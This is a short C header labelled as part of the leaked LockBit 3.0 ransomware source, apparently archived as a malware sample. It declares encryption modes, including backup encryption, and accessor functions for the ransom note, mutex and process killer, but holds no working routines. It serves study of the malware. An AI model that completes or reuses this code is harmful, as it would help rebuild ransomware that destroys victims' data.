/*
  name      LockBit 3.0 (Black)
  type      ransomware
  cve       —
  year      2022
  os        windows
  authors   LockBit Group
  source    https://github.com/Zzutiky666/LockBit (leaked source)
  archived  krisyotam
  notes     leaked by disgruntled affiliate Sept 2022; most prolific RaaS 2022-2024
 */

#pragma once
#include "common.h"

enum EncryptModes {

	ALL_ENCRYPT = 10,
	LOCAL_ENCRYPT = 11,
	NETWORK_ENCRYPT = 12,
	BACKUPS_ENCRYPT = 13

};


namespace global {

	PWCHAR GetExtention();
	PCHAR GetDecryptNote(PDWORD pdwDecryptNote);
	PCHAR GetMutexName();
	VOID SetEncryptMode(INT EncryptMode);
	INT GetEncryptMode();
	VOID SetProcKiller(BOOL IsEnabled);
	BOOL GetProcKiller();

}